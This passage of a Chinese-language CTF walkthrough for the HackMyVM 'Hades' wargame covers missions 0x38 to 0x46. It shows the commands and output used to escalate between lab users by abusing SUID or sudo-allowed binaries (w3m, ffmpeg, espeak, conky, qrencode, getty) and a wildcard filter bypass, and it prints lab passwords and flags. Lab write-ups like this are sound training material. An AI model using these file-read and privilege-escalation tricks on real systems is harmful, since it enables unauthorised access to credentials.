                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span>Password:<span class="token operator">&lt;</span>/label<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"password"</span> required<span class="token operator">></span>
                <span class="token operator">&lt;</span>br<span class="token operator">></span>
                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"Login"</span><span class="token operator">></span>
            <span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ianthe@hades:~$ <span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"Origin: hackmyvm.hmv"</span> <span class="token parameter variable">-d</span> <span class="token string">"username=admin&amp;password=admin"</span> http://localhost/irene_auth.php
TDyuLyWLDksEhgmAYDJCianthe@hades:~$ </code></pre>
<p>拿到密码<code>TDyuLyWLDksEhgmAYDJC</code></p>
<pre class="language-none"><code class="language-none">&#96;&#96;&#96;bash
irene@hades:~$ cat flagz.txt 
^ZACnrFArVosWGJNfPkN^</code></pre>
<h2 id="MISSION-0x38"><a href="#MISSION-0x38" class="headerlink" title="MISSION 0x38"></a>MISSION 0x38</h2><pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x38 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User iris hates some characters.

<span class="token comment">## ES ##</span>
La usuaria iris odia algunos caracteres.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
qwe
Invalid character<span class="token operator">!</span><span class="token operator">!</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
/pwned/iris/flagz.txt
Invalid character<span class="token operator">!</span><span class="token operator">!</span></code></pre>
<p>试了一下不能输入字母，试了一下可以使用通配符?绕过，比如读取irene的flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ ./hatechars 
Enter <span class="token function">file</span> to show:
/?????/?????/?????????
^ZACnrFArVosWGJNfPkN^
/bin/cat: /pwned/irene/hatechars: Permission denied</code></pre>
<p>但是不知道iris密码放哪儿了,看了wp发现在etc下面的一个目录里<br>找一下iris用户的文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> iris <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/dev/pts/1
/etc/met.txt</code></pre>
<p>应该放在&#x2F;etc&#x2F;met.txt里面了，防止读取过多文件，直接去etc目录使用hatechars</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">irene@hades:/etc$ /pwned/irene/hatechars
Enter <span class="token function">file</span> to show:
???????  
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
ignore Received Message-Id Resent-Message-Id Status Mail-From Return-Path Via Delivered-To
FiqGNcXumTKwLTPRqXMh
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>密码<code>FiqGNcXumTKwLTPRqXMh</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">cat</span> flagz.txt 
^xXcULtRBXxcHIUVxtXT^</code></pre>
<h2 id="MISSSION-0x39"><a href="#MISSSION-0x39" class="headerlink" title="MISSSION 0x39"></a>MISSSION 0x39</h2><pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x39 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User kore likes to navigate<span class="token operator">!</span> 

<span class="token comment">## ES ##</span>
A la usuaria kore le gusta navegar<span class="token operator">!</span></code></pre>
<p>没有sudo，没有文件，搜一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> kore <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/srv/kore_pass.txt
/dev/pts/3
/usr/bin/w3m
/var/tmp/a.avi
/var/tmp/b.avi
/var/tmp/ff.py
/var/tmp/sss.mp4
/var/tmp/temp_txt.txt</code></pre>
<p>有一条指令w3m是kore的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/w3m
-rwS--s--- <span class="token number">1</span> kore iris <span class="token number">1630888</span> Jan <span class="token number">29</span>  <span class="token number">2023</span> /usr/bin/w3m</code></pre>
<p>有suid权限，直接读密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iris@hades:~$ /usr/bin/w3m /srv/kore_pass.txt <span class="token parameter variable">-dump</span>
mdAXiSXteTPiGGTpmajP</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">cat</span> flagz.txt 
^FEYohPSMjrxKzdLNxkQ^</code></pre>
<h2 id="MISSION-0x40"><a href="#MISSION-0x40" class="headerlink" title="MISSION 0x40"></a>MISSION 0x40</h2><pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x40 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User leda always wanted to edit videos.

<span class="token comment">## ES ##</span>
La usuaria leda siempre quiso editar videos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> leda <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/usr/bin/ffmpeg
/var/tmp/sss5.mp4
/var/tmp/sss3.mp4
/var/tmp/sss2.mp4
/var/tmp/sa.txt
/var/tmp/1234
/var/tmp/output.mp4
/etc/led</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /etc/led
-r--r----- <span class="token number">1</span> leda leda <span class="token number">14</span> Sep <span class="token number">21</span>  <span class="token number">2005</span> /etc/led
kore@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/ffmpeg
-rwS--s--- <span class="token number">1</span> leda kore <span class="token number">293288</span> Nov <span class="token number">11</span>  <span class="token number">2023</span> /usr/bin/ffmpeg</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">kore@hades:~$ /usr/bin/ffmpeg <span class="token parameter variable">-f</span> concat  <span class="token parameter variable">-safe</span> <span class="token number">0</span>  <span class="token parameter variable">-i</span> /etc/led                                                                                                                                                                                
ffmpeg version <span class="token number">5.1</span>.4-0+deb12u1 Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>-2023 the FFmpeg developers
  built with gcc <span class="token number">12</span> <span class="token punctuation">(</span>Debian <span class="token number">12.2</span>.0-14<span class="token punctuation">)</span>
  configuration: <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr --extra-version<span class="token operator">=</span><span class="token number">0</span>+deb12u1 <span class="token parameter variable">--toolchain</span><span class="token operator">=</span>hardened <span class="token parameter variable">--libdir</span><span class="token operator">=</span>/usr/lib/x86_64-linux-gnu <span class="token parameter variable">--incdir</span><span class="token operator">=</span>/usr/include/x86_64-linux-gnu <span class="token parameter variable">--arch</span><span class="token operator">=</span>amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libsvtav1 --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --disable-sndio --enable-libjxl --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-libplacebo --enable-librav1e --enable-shared
  libavutil      <span class="token number">57</span>. <span class="token number">28.100</span> / <span class="token number">57</span>. <span class="token number">28.100</span>
  libavcodec     <span class="token number">59</span>. <span class="token number">37.100</span> / <span class="token number">59</span>. <span class="token number">37.100</span>
  libavformat    <span class="token number">59</span>. <span class="token number">27.100</span> / <span class="token number">59</span>. <span class="token number">27.100</span>
  libavdevice    <span class="token number">59</span>.  <span class="token number">7.100</span> / <span class="token number">59</span>.  <span class="token number">7.100</span>
  libavfilter     <span class="token number">8</span>. <span class="token number">44.100</span> /  <span class="token number">8</span>. <span class="token number">44.100</span>
  libswscale      <span class="token number">6</span>.  <span class="token number">7.100</span> /  <span class="token number">6</span>.  <span class="token number">7.100</span>
  libswresample   <span class="token number">4</span>.  <span class="token number">7.100</span> /  <span class="token number">4</span>.  <span class="token number">7.100</span>
  libpostproc    <span class="token number">56</span>.  <span class="token number">6.100</span> / <span class="token number">56</span>.  <span class="token number">6.100</span>
<span class="token punctuation">[</span>concat @ 0x5576dfdaee00<span class="token punctuation">]</span> Line <span class="token number">1</span>: unknown keyword <span class="token string">'NODEVILINHELL'</span>
/etc/led: Invalid data found when processing input </code></pre>
<p>密码<code>NODEVILINHELL</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">cat</span> flagz.txt 
^wHseqgzsZUNyruSnxnl^</code></pre>
<h2 id="MISSION-0x41"><a href="#MISSION-0x41" class="headerlink" title="MISSION 0x41"></a>MISSION 0x41</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################</span>
<span class="token comment"># MISSION 0x41 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User maia hears everything. 

<span class="token comment">## ES ##</span>
La usuaria maia lo oye todo.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> leda on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User leda may run the following commands on hades:
    <span class="token punctuation">(</span>maia<span class="token punctuation">)</span> NOPASSWD: /usr/bin/espeak</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">leda@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> maia espeak <span class="token parameter variable">-qXf</span> /etc/maia.txt
Translate <span class="token string">'givemeanewmind'</span>
 <span class="token number">22</span>     g <span class="token punctuation">(</span>i     <span class="token punctuation">[</span>dZ<span class="token punctuation">]</span>
  <span class="token number">1</span>     g        <span class="token punctuation">[</span>g<span class="token punctuation">]</span>
 <span class="token number">46</span>     g <span class="token punctuation">(</span>ive   <span class="token punctuation">[</span>g<span class="token punctuation">]</span>

 <span class="token number">82</span>     _g<span class="token punctuation">)</span> iv <span class="token punctuation">(</span>e <span class="token punctuation">[</span>Iv<span class="token punctuation">]</span>
 <span class="token number">57</span>     iv <span class="token punctuation">(</span>e<span class="token comment">#   [aIv]</span>
  <span class="token number">1</span>     i        <span class="token punctuation">[</span>I<span class="token punctuation">]</span>
 <span class="token number">36</span>     i <span class="token punctuation">(</span>Be<span class="token comment">#   [aI]</span>

  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     m        <span class="token punctuation">[</span>m<span class="token punctuation">]</span>

 <span class="token number">36</span>     ea       <span class="token punctuation">[</span>i:<span class="token punctuation">]</span>
  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     n        <span class="token punctuation">[</span>n<span class="token punctuation">]</span>

 <span class="token number">22</span>     ew       <span class="token punctuation">[</span>ju:<span class="token punctuation">]</span>
  <span class="token number">1</span>     e        <span class="token punctuation">[</span>E<span class="token punctuation">]</span>

  <span class="token number">1</span>     m        <span class="token punctuation">[</span>m<span class="token punctuation">]</span>

 <span class="token number">78</span>     m<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>d <span class="token punctuation">[</span>aIn<span class="token punctuation">]</span>
  <span class="token number">1</span>     i        <span class="token punctuation">[</span>I<span class="token punctuation">]</span>

  <span class="token number">1</span>     d        <span class="token punctuation">[</span>d<span class="token punctuation">]</span>

 g'IvI2m,i:nju:m,aInd</code></pre>
<p>givemeanewmind换成大写登录上去<code>GIVEMEANEWMIND</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">maia@hades:~$ <span class="token function">cat</span> flagz.txt 
^GWsDBTCiXdZDNtRzVGt^</code></pre>
<h2 id="MISSION-0x42"><a href="#MISSION-0x42" class="headerlink" title="MISSION 0x42"></a>MISSION 0x42</h2><pre class="language-bash" data-language="bash"><code class="language-bash">maia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x42 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
It seems that user nephele has broken the image.

<span class="token comment">## ES ##</span>
Parece que la usuaria nephele ha roto la imagen.</code></pre>
<p>修复一下png文件头<br><img src="https://ooo.0x0.ooo/2024/07/06/OPLCH1.png" alt="OPLCH1.png" loading="lazy"><br>拿到密码<code>rZtaitCxlEIRxBayVpgZ</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> flagz.txt 
^oSiWofNrDjNWbcAqMAx^</code></pre>
<h2 id="MISSION-0x43"><a href="#MISSION-0x43" class="headerlink" title="MISSION 0x43"></a>MISSION 0x43</h2><pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x43 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The nyx user visits some websites that we <span class="token keyword">do</span> not know.

<span class="token comment">## ES ##</span>
La usuaria nyx visita algunas webs que no conocemos.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nephele@hades:~$ <span class="token function">cat</span> /etc/hosts
<span class="token number">127.0</span>.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<span class="token number">172.66</span>.0.66     hades
<span class="token number">127.0</span>.0.1       hades.hmv 
<span class="token number">127.0</span>.0.1       whatsmypass.hmv 
nephele@hades:~$ <span class="token function">curl</span> http://whatsmypass.hmv
HXisrOPSdTcSSTEyyaLn</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">cat</span> flagz.txt 
^BdYvJtfaTyfaliZPBkG^</code></pre>
<h2 id="MISSION-0x44"><a href="#MISSION-0x44" class="headerlink" title="MISSION 0x44"></a>MISSION 0x44</h2><pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x44 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User pallas has her desktop tuned with conky.

<span class="token comment">## ES ##</span>
La usuaria pallas tiene <span class="token function">su</span> desktop tuneado con conky.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> nyx on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User nyx may run the following commands on hades:
    <span class="token punctuation">(</span>pallas<span class="token punctuation">)</span> NOPASSWD: /usr/bin/conky</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pallas conky <span class="token parameter variable">-h</span>
Usage: conky <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>.
conky is a system monitor that renders text on desktop or to own transparent
window. Command line options will override configurations defined <span class="token keyword">in</span> config
file.
   -v, <span class="token parameter variable">--version</span>             version
   -q, <span class="token parameter variable">--quiet</span>               quiet mode
   -D, <span class="token parameter variable">--debug</span>               increase debugging output, ie. <span class="token parameter variable">-DD</span> <span class="token keyword">for</span> <span class="token function">more</span> debugging
   -c, <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE         config <span class="token function">file</span> to load
   -C, --print-config        print the <span class="token builtin class-name">builtin</span> default config to stdout
                             e.g. <span class="token string">'conky -C > ~/.conkyrc'</span> will create a new default config
   -d, <span class="token parameter variable">--daemonize</span>           daemonize, fork to background
   -h, <span class="token parameter variable">--help</span>                <span class="token builtin class-name">help</span>
   -a, <span class="token parameter variable">--alignment</span><span class="token operator">=</span>ALIGNMENT text alignment on screen, <span class="token punctuation">&#123;</span>top,bottom,middle<span class="token punctuation">&#125;</span>_<span class="token punctuation">&#123;</span>left,right,middle<span class="token punctuation">&#125;</span>
   -X, <span class="token parameter variable">--display</span><span class="token operator">=</span><span class="token environment constant">DISPLAY</span>     X11 display to use
   -m, --xinerama-head<span class="token operator">=</span>N     Xinerama monitor index <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=</span>first<span class="token punctuation">)</span>
   -f, <span class="token parameter variable">--font</span><span class="token operator">=</span>FONT           font to use
   -o, --own-window          create own window to draw
   -b, --double-buffer       double buffer <span class="token punctuation">(</span>prevents flickering<span class="token punctuation">)</span>
   -w, --window-id<span class="token operator">=</span>WIN_ID    window <span class="token function">id</span> to draw
   <span class="token parameter variable">-x</span> X                      x position
   <span class="token parameter variable">-y</span> Y                      y position
   -t, <span class="token parameter variable">--text</span><span class="token operator">=</span>TEXT           text to render, remember single quotes, like <span class="token parameter variable">-t</span> <span class="token string">'$uptime'</span>
   -u, <span class="token parameter variable">--interval</span><span class="token operator">=</span>SECS       update interval
   <span class="token parameter variable">-i</span> COUNT                  number of <span class="token builtin class-name">times</span> to update conky <span class="token punctuation">(</span>and quit<span class="token punctuation">)</span>
   -p, <span class="token parameter variable">--pause</span><span class="token operator">=</span>SECS          pause <span class="token keyword">for</span> SECS seconds at startup before doing anything</code></pre>
<p>可以读取配置文件，上一题我搜到一个tmp下面的44题的配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/var/tmp/conky.conf
/var/tmp/temp.conf
/var/tmp/abc.conf
/var/tmp/44conky.conf</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">nyx@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pallas conky <span class="token parameter variable">-c</span>  /var/tmp/44conky.conf
conky: drawing to single buffer
conky: invalid setting of <span class="token builtin class-name">type</span> <span class="token string">'table'</span>
Info:                                 
Uptime: 43d 18h 46m
Frequency <span class="token punctuation">(</span>in MHz<span class="token punctuation">)</span>: <span class="token number">2397</span>
Frequency <span class="token punctuation">(</span>in GHz<span class="token punctuation">)</span>: <span class="token number">2.40</span>
RAM Usage: 887MiB/1.94GiB - <span class="token number">44</span>% <span class="token comment">####......</span>
Swap Usage: 0B/0B - <span class="token number">0</span>% <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
CPU Usage: <span class="token number">3</span>% <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
Processes: <span class="token number">35</span>  Running: <span class="token number">0</span>
File systems:
 / <span class="token number">8</span>.07GiB/18.8GiB <span class="token comment">####......</span>
Networking:
Up: 0B  - Down: 0B
Name              PID     CPU%   MEM%
 php-fpm8.2       <span class="token number">3697840</span>   <span class="token number">0.00</span>   <span class="token number">0.59</span>
 php-fpm8.2       <span class="token number">3697839</span>   <span class="token number">0.00</span>   <span class="token number">0.53</span>
 php-fpm8.2       <span class="token number">3697838</span>   <span class="token number">0.00</span>   <span class="token number">0.60</span>
 inspircd         <span class="token number">1033494</span>   <span class="token number">0.00</span>   <span class="token number">0.05</span>
^irzKewMCfnhnIMTCJlW^</code></pre>
<p>拿到flag，找不到密码，那就交flag，看官网的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas/wWxyXnNbmjxNMEAIjbjT</code></pre>
<h2 id="MISSION-0x45"><a href="#MISSION-0x45" class="headerlink" title="MISSION 0x45"></a>MISSION 0x45</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x45 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User pandora likes squares.

<span class="token comment">## ES ##</span>
A la usuaria pandora le gustan los cuadrados.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> pallas on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User pallas may run the following commands on hades:
    <span class="token punctuation">(</span>pandora<span class="token punctuation">)</span> NOPASSWD: /usr/bin/qrencode</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pandora qrencode <span class="token parameter variable">-h</span>
qrencode version <span class="token number">4.1</span>.1
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2006</span>-2017 Kentaro Fukuchi
Usage: qrencode <span class="token punctuation">[</span>-o FILENAME<span class="token punctuation">]</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>STRING<span class="token punctuation">]</span>
Encode input data <span class="token keyword">in</span> a QR Code and save as a PNG or EPS image.

  <span class="token parameter variable">-h</span>           display this message.
  <span class="token parameter variable">--help</span>       display the usage of long options.
  <span class="token parameter variable">-o</span> FILENAME  <span class="token function">write</span> image to FILENAME. If <span class="token string">'-'</span> is specified, the result
               will be output to standard output. If <span class="token parameter variable">-S</span> is given, structured
               symbols are written to FILENAME-01.png, FILENAME-02.png, <span class="token punctuation">..</span>.
               <span class="token punctuation">(</span>suffix is removed from FILENAME, <span class="token keyword">if</span> specified<span class="token punctuation">)</span>
  <span class="token parameter variable">-r</span> FILENAME  <span class="token builtin class-name">read</span> input data from FILENAME.
  <span class="token parameter variable">-s</span> NUMBER    specify module size <span class="token keyword">in</span> dots <span class="token punctuation">(</span>pixels<span class="token punctuation">)</span>. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span>LMQH<span class="token punctuation">&#125;</span>    specify error correction level from L <span class="token punctuation">(</span>lowest<span class="token punctuation">)</span> to H <span class="token punctuation">(</span>highest<span class="token punctuation">)</span>.
               <span class="token punctuation">(</span>default<span class="token operator">=</span>L<span class="token punctuation">)</span>
  <span class="token parameter variable">-v</span> NUMBER    specify the minimum version of the symbol. <span class="token punctuation">(</span>default<span class="token operator">=</span>auto<span class="token punctuation">)</span>
  <span class="token parameter variable">-m</span> NUMBER    specify the width of the margins. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">for</span> Micro<span class="token punctuation">))</span>
  <span class="token parameter variable">-d</span> NUMBER    specify the DPI of the generated PNG. <span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token number">72</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-t</span> <span class="token punctuation">&#123;</span>PNG,PNG32,EPS,SVG,XPM,ANSI,ANSI256,ASCII,ASCIIi,UTF8,UTF8i,ANSIUTF8,ANSIUTF8i,ANSI256UTF8<span class="token punctuation">&#125;</span>
               specify the <span class="token builtin class-name">type</span> of the generated image. <span class="token punctuation">(</span>default<span class="token operator">=</span>PNG<span class="token punctuation">)</span>
  <span class="token parameter variable">-S</span>           <span class="token function">make</span> structured symbols. Version number must be specified with <span class="token string">'-v'</span><span class="token builtin class-name">.</span>
  <span class="token parameter variable">-k</span>           assume that the input text contains kanji <span class="token punctuation">(</span>shift-jis<span class="token punctuation">)</span>.
  <span class="token parameter variable">-c</span>           encode lower-case alphabet characters <span class="token keyword">in</span> <span class="token number">8</span>-bit mode. <span class="token punctuation">(</span>default<span class="token punctuation">)</span>
  <span class="token parameter variable">-i</span>           ignore <span class="token keyword">case</span> distinctions and use only upper-case characters.
  <span class="token parameter variable">-8</span>           encode entire data <span class="token keyword">in</span> <span class="token number">8</span>-bit mode. -k, <span class="token parameter variable">-c</span> and <span class="token parameter variable">-i</span> will be ignored.
  <span class="token parameter variable">-M</span>           encode <span class="token keyword">in</span> a Micro QR Code.
  <span class="token parameter variable">-V</span>           display the version number and copyrights of the qrencode.
  <span class="token punctuation">[</span>STRING<span class="token punctuation">]</span>     input data. If it is not specified, data will be taken from
               standard input.

  Try <span class="token string">"qrencode --help"</span> <span class="token keyword">for</span> <span class="token function">more</span> options.</code></pre>
<p>可以读取文件转化成二维码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pallas@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pandora qrencode <span class="token parameter variable">-r</span> /pwned/pandora/flagz.txt <span class="token parameter variable">-o</span> /var/tmp/452</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/06/OPEOxD.png" alt="OPEOxD.png" loading="lazy"><br>拿到第45题flag<code>^pjDuPNQVgyhgigOIiwm^</code>，去官网拿下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora/HhVHfmbBIiZbZSgcgadh</code></pre>
<h2 id="MISSION-0x46"><a href="#MISSION-0x46" class="headerlink" title="MISSION 0x46"></a>MISSION 0x46</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x46 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User penelope lets us <span class="token keyword">do</span> something<span class="token punctuation">..</span>.

<span class="token comment">## ES ##</span>
La usuaria penelope nos permite hacer algo<span class="token punctuation">..</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> penelope <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> proc
/dev/mqueue/linpeas.txt28556
/usr/bin/getty
/var/tmp/fibi
/var/tmp/fibi/pass.txt
/var/tmp/fibi/s.sh
/etc/pene.conf</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/bin/getty
-rwsr-sr-x <span class="token number">1</span> penelope pandora <span class="token number">69112</span> Apr  <span class="token number">5</span> 06:36 /usr/bin/getty</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pandora@hades:~$ getty <span class="token parameter variable">-8</span> - <span class="token parameter variable">--chroot</span> /pwned/penelope --skip-login --issue-file /etc/pene.conf --login-program <span class="token string">'cat /pwned/penelope/*> /tmp/rj/1/ct'</span>

anoRxVKulaoMNKMrddVe</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:~$ <span class="token function">cat</span> flagz.txt 
^OGaiNcpusBXCHrDZjwN^</code></pre>
<h2 id="MISSION-0x47"><a href="#MISSION-0x47" class="headerlink" title="MISSION 0x47"></a>MISSION 0x47</h2><pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x47 #</span>
<span class="token comment">################</span>

